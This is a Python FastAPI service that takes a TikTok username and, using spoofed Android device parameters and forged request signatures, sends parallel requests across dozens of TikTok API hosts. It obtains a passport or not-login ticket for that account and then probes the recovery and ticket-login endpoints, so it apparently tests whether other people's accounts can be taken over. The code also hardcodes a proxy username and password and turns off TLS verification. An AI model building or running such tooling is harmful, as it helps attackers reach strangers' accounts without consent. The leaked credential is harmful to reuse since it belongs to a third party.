from fastapi import FastAPI
from pydantic import BaseModel
import httpx
import asyncio
import time
import random
import secrets
import SignerPy

app = FastAPI()


# ======================
# REQUEST
# ======================
class UserRequest(BaseModel):
    username: str


# ======================
# FLOW CLASS (ASYNC)
# ======================
class TikTokFlow:
    def __init__(self, username: str):
        self.username = username.strip()

        proxy = "infproxy_checkemail509:NLI8oq4ZQC2fJ3yJDcSv@proxy.infiniteproxies.com:1111"

        self.proxies = {
            "http://": f"http://{proxy}",
            "https://": f"http://{proxy}",
        }

        # 🔥 ALL HOSTS (UNCHANGED)
        self.hosts = [
            "api16-core-aion-useast5.us.tiktokv.com",
            "api16-core-apix-quic.tiktokv.com",
            "api16-core-apix.tiktokv.com",
            "api16-core-baseline.tiktokv.com",
            "api16-core-c-alisg.tiktokv.com",
            "api16-core-c-useast1a.tiktokv.com",
            "api16-core-quic.tiktokv.com",
            "api16-core-useast5.us.tiktokv.com",
            "api16-core-useast8.us.tiktokv.com",
            "api16-core-va.tiktokv.com",
            "api16-core-ycru.tiktokv.com",
            "api16-core-zr.tiktokv.com",
            "api16-core.tiktokv.com",
            "api16-core.ttapis.com",
            "api16-normal-aion-useast5.us.tiktokv.com",
            "api16-normal-apix-quic.tiktokv.com",
            "api16-normal-apix.tiktokv.com",
            "api16-normal-baseline.tiktokv.com",
            "api16-normal-c-alisg.tiktokv.com",
            "api16-normal-c-useast1a.tiktokv.com",
            "api16-normal-c-useast1a.musical.ly",
            "api16-normal-no1a.tiktokv.eu",
            "api16-normal-quic.tiktokv.com",
            "api16-normal-useast5.tiktokv.us",
            "api16-normal-useast5.us.tiktokv.com",
            "api16-normal-useast8.us.tiktokv.com",
            "api16-normal-va.tiktokv.com",
            "api16-normal-vpc2-useast5.us.tiktokv.com",
            "api16-normal-zr.tiktokv.com",
            "api16-normal.tiktokv.com",
            "api19-core-c-alisg.tiktokv.com",
            "api19-core-c-useast1a.tiktokv.com",
            "api19-core-useast5.us.tiktokv.com",
            "api19-core-va.tiktokv.com",
            "api19-core-zr.tiktokv.com",
            "api19-core.tiktokv.com",
            "api19-normal-c-alisg.tiktokv.com",
            "api19-normal-c-useast1a.tiktokv.com",
            "api19-normal.tiktokv.com"
        ]

        self.base_params = {
            "device_platform": "android",
            "ssmix": "a",
            "channel": "googleplay",
            "aid": "1233",
            "app_name": "musical_ly",
            "version_code": "370805",
            "version_name": "37.8.5",
            "manifest_version_code": "2023708050",
            "update_version_code": "2023708050",
            "ab_version": "37.8.5",
            "os_version": "10",
            "device_type": f"rk{random.randint(3000,4000)}",
            "device_id": str(random.randint(10**18, 10**19-1)),
            "iid": str(random.randint(10**18, 10**19-1)),
            "openudid": secrets.token_hex(8),
            "resolution": "1600*900",
            "dpi": "240",
            "language": "ar",
            "os_api": "29",
            "ac": "wifi",
            "timezone_name": "Asia/Riyadh",
            "carrier_region": "SA",
            "sys_region": "SA",
            "region": "SA",
            "app_language": "ar",
            "timezone_offset": "10800",
            "request_tag_from": "h5",
            "scene": "4",
            "mix_mode": "1"
        }

        self.headers = {
            "User-Agent": f"com.zhiliaoapp.musically/{self.base_params['manifest_version_code']} (Linux; Android 10)"
        }

    # ======================
    def build_headers(self, params):
        sig = SignerPy.sign(params=params)
        h = self.headers.copy()
        h.update(sig)
        return h

    def fresh_params(self):
        p = self.base_params.copy()
        ts = int(time.time())
        p["ts"] = ts
        p["_rticket"] = int(ts * 1000)
        return p

    # ======================
    # ASYNC REQUEST WRAPPER
    # ======================
    async def request(self, client, method, url, params=None):
        try:
            r = await client.request(
                method,
                url,
                params=params,
                timeout=5
            )
            return r.text
        except:
            return None

    # ======================
    # LOOKUP (PARALLEL)
    # ======================
    async def get_ticket(self):
        async with httpx.AsyncClient(proxies=self.proxies, verify=False) as client:

            tasks = []

            for host in self.hosts:
                params = self.fresh_params()
                params["account_param"] = self.username

                headers = self.build_headers(params)
                headers["x-tt-passport-csrf-token"] = secrets.token_hex(16)

                url = f"https://{host}/passport/account_lookup/username/"

                async def run(host=host, params=params, headers=headers, url=url):
                    try:
                        r = await client.post(url, params=params, headers=headers)

                        print(f"\n🔥 LOOKUP [{host}]")
                        print(r.text[:500])

                        j = r.json()
                        acc = j.get("data", {}).get("accounts", [])
                        if acc:
                            a = acc[0]
                            return (
                                a.get("passport_ticket") or a.get("not_login_ticket"),
                                a.get("oauth_login_only", False),
                            )
                    except:
                        return None

                tasks.append(run())

            results = await asyncio.gather(*tasks)

            for r in results:
                if r:
                    return r

        return None, None

    # ======================
    # SAFE / AUTH / LOGIN PARALLEL
    # ======================
    async def check_safe(self, client, ticket):
        tasks = []

        for host in self.hosts:
            params = self.fresh_params()
            params["not_login_ticket"] = ticket
            params["target"] = "recover_account"

            url = f"https://{host}/passport/shark/safe_verify/"

            async def run(h=host, p=params, u=url):
                try:
                    r = await client.get(u, params=p)
                    text = r.text

                    print(f"[SAFE {h}] -> {text}")

                    if "2029" in text:
                        return True
                except:
                    return False

            tasks.append(run())

        res = await asyncio.gather(*tasks)
        return any(res)

    async def check_auth(self, client, ticket):
        tasks = []

        for host in self.hosts:
            params = self.fresh_params()
            params["not_login_ticket"] = ticket

            url = f"https://{host}/passport/auth/available_ways/"

            async def run(h=host):
                try:
                    r = await client.get(url, params=params)
                    text = r.text

                    print(f"[AUTH {h}] -> {text}")

                    return "success" in text
                except:
                    return False

            tasks.append(run())

        res = await asyncio.gather(*tasks)
        return any(res)

    async def check_login(self, client, ticket):
        tasks = []

        for host in self.hosts:
            params = self.fresh_params()
            params["passport_ticket"] = ticket

            url = f"https://{host}/passport/user/login_by_passport_ticket/"

            async def run(h=host):
                try:
                    r = await client.post(url, params=params)
                    text = r.text

                    print(f"[LOGIN {h}] -> {text}")

                    return "2135" in text
                except:
                    return False

            tasks.append(run())

        res = await asyncio.gather(*tasks)
        return any(res)

    # ======================
    # MAIN FLOW
    # ======================
    async def run(self):
        ticket, oauth = await self.get_ticket()

        if not ticket:
            return {"error": "no_ticket"}

        async with httpx.AsyncClient(proxies=self.proxies, verify=False) as client:

            if not oauth:
                return {
                    "mode": "login",
                    "result": await self.check_login(client, ticket)
                }

            safe_ok = await self.check_safe(client, ticket)

            if safe_ok:
                return {
                    "mode": "auth",
                    "result": await self.check_auth(client, ticket)
                }

        return {"error": "flow_failed"}


# ======================
# FASTAPI ROUTE
# ======================
@app.get("/check")
async def check(username: str):
    flow = TikTokFlow(username)
    return await flow.run()
